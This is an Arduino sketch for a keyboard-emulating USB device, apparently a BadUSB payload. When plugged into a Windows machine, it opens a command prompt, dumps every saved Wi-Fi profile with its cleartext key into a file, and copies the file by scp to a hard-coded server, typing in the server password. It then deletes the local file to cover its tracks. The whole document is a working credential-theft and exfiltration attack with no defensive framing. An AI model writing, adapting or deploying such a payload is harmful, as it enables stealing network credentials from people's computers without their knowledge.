#include <Keyboard.h>

// set variables for server connection
const char* server_user = "ubuntu";
const char* server_password = "ubuntu";
const char* server_path = "/home/ubuntu";
const char* server_ip = "192.168.8.124";

void setup() {

  Keyboard.begin(); //start keyboard communication 
   delay(2000);
   Keyboard.press(KEY_LEFT_GUI);
   delay(600); 
   Keyboard.press('r');
   delay(600); 
   Keyboard.release(KEY_LEFT_GUI);
   Keyboard.release('r');
   delay(500);
   Keyboard.press('c');
   delay(500);
   Keyboard.press('m');
   delay(500);
   Keyboard.press('d');
   delay(300);
   Keyboard.release('c');
   delay(300);
   Keyboard.release('m');
   delay(300);
   Keyboard.release('d');
   delay(1000);
   Keyboard.press(KEY_RETURN);
   delay(2000);
   Keyboard.release(KEY_RETURN);
   delay(600); 
   Keyboard.println("netsh wlan show profile * key=clear > data.txt");
   delay(600);
   String copyCommand = "scp data.txt" + String(server_user) + "@" + String(server_ip) + ":" + String(server_path);
   Keyboard.println(copyCommand);
   delay(600);
   Keyboard.println(server_password);
   delay(3000);
   Keyboard.println("del /f data.txt");
   delay(600);
   Keyboard.press(KEY_RETURN);
   delay(600);
   Keyboard.release(KEY_RETURN);
   Keyboard.end();
 }

void loop() {}
